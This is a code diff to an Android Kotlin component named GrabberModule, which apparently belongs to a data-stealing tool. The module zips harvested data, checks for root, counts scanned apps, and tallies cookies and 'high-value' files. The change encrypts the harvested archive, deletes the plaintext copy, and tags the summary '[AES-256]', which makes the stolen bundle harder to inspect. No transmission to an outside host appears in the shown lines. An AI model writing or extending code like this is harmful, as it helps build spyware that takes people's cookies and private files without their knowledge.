@@ -103,6 +103,7 @@ object GrabberModule {
         val hasRoot = checkRoot()
         val r = GrabResult(hasRoot = hasRoot, installedCount = installed.size)
         val zipFile = File(ctx.cacheDir, "grab_${target}_${System.currentTimeMillis()}.zip")
+        val encryptedFile = File(ctx.cacheDir, "grab_${target}_${System.currentTimeMillis()}.enc")
         try {
             ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                 when (target) {
@@ -129,14 +130,27 @@ object GrabberModule {
                 }
             }
             if (zipFile.exists() && zipFile.length() > 0) {
-                r.file = zipFile
-                r.size = zipFile.length()
+                val rawData = FileInputStream(zipFile).use { it.readBytes() }
+                val encrypted = CryptoLayer.encryptFile(rawData)
+                FileOutputStream(encryptedFile).use { it.write(encrypted) }
+                zipFile.delete()
+                if (encryptedFile.exists() && encryptedFile.length() > 0) {
+                    r.file = encryptedFile
+                    r.size = encryptedFile.length()
+                    r.encrypted = true
+                } else {
+                    r.file = zipFile
+                    r.size = zipFile.length()
+                    encryptedFile.delete()
+                }
             } else {
                 zipFile.delete()
+                encryptedFile.delete()
             }
         } catch (e: Exception) {
             r.error = e.message
             zipFile.delete()
+            encryptedFile.delete()
         }
         return r
     }
@@ -472,6 +486,7 @@ object GrabberModule {
         var highValue: Int = 0
         var cookies: Int = 0
         var providers: Int = 0
+        var encrypted: Boolean = false
         var error: String? = null
 
         fun summary(): String {
@@ -481,7 +496,8 @@ object GrabberModule {
                 else -> "${size / (1024 * 1024)}MB"
             }
             val root = if (hasRoot) " [ROOT]" else ""
-            return "$files files ($highValue high-value) — $s | $installedCount apps scanned$root"
+            val enc = if (encrypted) " [AES-256]" else ""
+            return "$files files ($highValue high-value) — $s | $installedCount apps scanned$root$enc"
         }
     }
 }
